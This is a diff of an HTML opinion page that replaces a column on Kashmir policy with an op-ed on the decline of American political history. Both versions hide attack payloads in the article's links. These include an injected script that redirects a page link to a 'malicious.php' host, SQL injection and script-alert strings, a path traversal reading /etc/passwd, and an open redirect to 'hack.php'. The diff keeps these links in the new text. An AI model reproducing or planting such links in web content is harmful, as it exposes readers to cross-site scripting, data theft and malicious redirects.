@@ -14,36 +14,46 @@
 <!-- Begin post -->
 
 
-
 <div class="single">
-<h2>Fifth column:Old slogans for a new problem</h2>
+<h2>Why Did We Stop Teaching Political History? </h2>
 
-
-
-<p class="details">By Tavleen Singh|August 28, 2016 1:00AM IST <a href="#">indianexpress</a> </p>
-<h2 align="right"><a href="20160827.opinion.php"> Previous </a> </h2>
+<p class="details">By FREDRIK LOGEVALL and KENNETH OSGOODAUG.Aug 29,2016 <a href="#">nytimes</a> </p>
+<h2 align="right"><a href="20160828-opinion.php"> Previous </a> </h2>
 
 <p>
-Finally we hear voices from the Kashmir Valley admitting that the nature of the violence has changed. This columnist has been pointing this out for some time, and every time, a small army of ‘liberals’ has attacked me with a virulence that is quite astounding. So it pleased me to hear a former deputy chief minister and the current <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">  Chief Minister of the state of Jammu & Kashmir </a> admit that the nature of the violence has changed in an ominous way.
-
+ <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank"> 
+American political history </a>, it would seem, is everywhere. Hardly a day passes without some columnist comparing Donald J. Trump to Huey Long, Father Coughlin or George Wallace. “All the Way,” a play about Lyndon B. Johnson, won a slew of awards and was turned into an HBO film.
 </p> <p>
-Muzaffar Baig said last week that Kashmir is no longer immune to the worldwide jihad and that when people demand azadi today, what they are asking for in fact is an Islamic state. Mehbooba Mufti was more circumspect at her joint press conference with the Union Home Minister in Srinagar, but she drew attention to increasing levels of terrorism in different parts of the world and urged Kashmiris to notice that it helped no cause. She used the Urdu word <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three"> ‘tashadut’, but it was clear that she meant jihadist terrorism.</a> She repeated what she has said before, that Kashmir’s children were being manipulated by a handful of people. It would be terrific if those intrepid reporters who dare to continue reporting from the Valley, amid curfew and violence, made some effort to identify who are the people guiding a movement that is apparently leaderless. It is more than likely that these invisible leaders will be jihadists with direct links to Pakistan.
+But the public’s love for political stories belies a crisis in the profession. American political history as a field of study has cratered. Fewer scholars build careers on studying the political process, in part because few universities make space for them. Fewer courses are available, and fewer students are exposed to it. What was once a central part of the historical profession, a vital part of this country’s continuing democratic discussion, is disappearing.
 </p> <p>
-
+This wasn’t always the case.<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three"> Political history — a specialization in elections and elected officials </a>, policy and policy making, parties and party politics — was once a dominant, if not the dominant, pursuit of American historians. Many of them, in turn, made vital contributions to the political process itself, whether it was Arthur Schlesinger Jr.’s role in the Kennedy White House or C. Vann Woodward’s “The Strange Career of Jim Crow,” which the Rev. Dr. Martin Luther King Jr. called the “bible of the civil rights movement.”
+</p> <p>
+But somewhere along the way, such work fell out of favor with history departments. According to the American Historical Association’s listing of academic departments, three-quarters of colleges and universities now lack full-time researchers and teachers in the subject.
+</p> <p>
 <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> 
-This is why it is worrying that the Prime Minister has </a> so far not articulated a clear Kashmir policy. He has received huge applause from self-appointed Kashmir experts for reviving Atal Bihari Vajpayee’s slogan of ‘insaniyat, Kashmiriat, jamhooriat’, but the truth is that the words have no meaning today. When Vajpayee used them, they had a context. He became prime minister at a time when the Kashmir Valley had seen nothing but violence and militarisation for more than a decade. Today the situation is completely different.
-
+There appears to be little effort to fill the void </a>. A search of the leading website advertising academic jobs in history, H-Net, yielded just 15 advertisements in the last 10 years specifically seeking a tenure-track, junior historian specializing in American political history. That’s right: just 15 new jobs in the last decade.
 </p> <p>
-Burhan Wani, whose death caused the current spate of violence,<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three"> was a peacetime terrorist. Last summer in Srinagar,</a> when I first heard of him, the Valley was filled with tourists. And a new government had taken over at the end of an election so fair that it brought the BJP into power for the first time ever. Wani was a modern jihadi who used the Internet to become a legend. In methods reminiscent of ISIS recruiters, he filled social media sites with pictures of himself and his comrades in military uniforms and with automatic weapons in their hands. It was clear from his videos that this was a new phase of violence that had nothing to do with Kashmir’s traditional separatists. Hurriyat leaders could not have controlled the violence that was caused by his death even if they had tried. The ‘experts’ advising the Home Minister to talk to Hurriyat are in a time warp.
+As a result, the study of America’s political past is being marginalized. Many college catalogs list precious few specialized courses on the subject, and survey courses often give scant attention to political topics. The pipelines for new Ph.D.s in the subject, and therefore new faculty, are drying up, and in many graduate programs one can earn a doctorate in American history with little exposure to politics.
 </p> <p>
 <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
-So what should happen next? </a> In my humble, non-expert opinion, I believe that the first thing the Prime Minister needs to do is draw up the contours of a new policy. This has to be a policy that seeks not just to find a permanent solution to our oldest political problem but that attempts seriously to counter Islamism. If the brutal version of Islam that ISIS propounds is finding support in India, it needs to be exposed for the barbaric, evil manifestation that it is. Do ordinary Kashmiri Muslims really want women to be shot for exposing their faces? Do they want Shariat punishments for thieves and adulterers? Do they want mullahs to control their lives? Do they want what has already happened in Pakistan to happen in the Kashmir Valley?
+How did it come to this? The trend began in the 1960s </a>. America’s misadventure in Vietnam led to broad questioning of elite decision making and conventional politics, and by extension those historical narratives that merely recounted the doings of powerful men. Likewise, the movements of the 1960s and 1970s by African-Americans, Latinos, women, homosexuals and environmental activists brought a new emphasis on history from the bottom up, spotlighting the role of social movements in shaping the nation’s past.
+</p> <p>
+The long overdue diversification of the academy also fostered changing perspectives. As a field once dominated by middle-class white males opened its doors to women, minorities and people from working-class backgrounds, recovering the lost experiences of these groups understandably became priority No. 1.
 </p> <p>
 <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank">
-There can be no pussyfooting and no pretence that the nature of the threat India faces in Kashmir </a> is now a very different thing to what it was even five years ago. To deal with it, the Prime Minister will need not just people who understand India’s security concerns but people who understand the political mistakes that created the problem as it exists today.
+These transformations enriched the national story </a>. But they also carried costs. Perceived “traditional” types of history that examined the doings of governing elites fell into disfavor, and political history suffered the effects (as did its cousins, diplomatic and military history).
+</p> <p>
+The ramifications extend well beyond higher education. The drying up of scholarly expertise affects universities’ ability to educate teachers — as well as aspiring lawyers, politicians, journalists and business leaders — who will enter their professions having learned too little about the nation’s political history. Not least, in this age of extreme partisanship, they’ll be insufficiently aware of the importance that compromise has played in America’s past, of the vital role of mutual give-and-take in the democratic process.
 </p> <p>
 <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php">
-Narendra Modi has a real chance to find a permanent solution </a> in Kashmir because he can go forward without carrying the baggage of past mistakes that so weighed down Congress prime ministers. Instead of looking for renewal of slogans and solutions from the Vajpayee era, he should begin with a clean slate and come up with new ideas. And although there is very little doubt that Pakistan is instigating the violence that has led to nearly two months of curfew in the Kashmir Valley, can we stop whining about this please? India is powerful enough to deal with the nuisance of a rogue neighbour without needing to whine about it in the forums of the world. Without a coherent, new strategy, there will be no permanent solution in Kashmir.
+Change will not be easy, and will not come from history departments facing tight budgets and competing demands </a>. What is needed, to begin with, is for university administrators to identify political history as a priority, for students and families to lobby their schools, for benefactors to endow professorships and graduate fellowships and for lawmakers and school boards to enact policies that bolster its teaching — and without politicizing the enterprise.
+</p> <p>
+<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">
+This matters. Knowledge of our political past is important because  </a> it can serve as an antidote to the misuse of history by our leaders and save us from being bamboozled by analogies, by the easy “lessons of the past.” It can make us less egocentric by showing us how other politicians and governments in other times have responded to division and challenge. And it can help us better understand the likely effects of our actions, a vital step in the acquisition of insight and maturity.
+</p> <p>
+Judging by the state of our political discourse during this dismal campaign season, the change can’t come soon enough.
+</p> <p>
+Fredrik Logevall is a professor of history and international affairs at Harvard. Kenneth Osgood is a professor of history at the Colorado School of Mines.
 </p>
 
 </div>
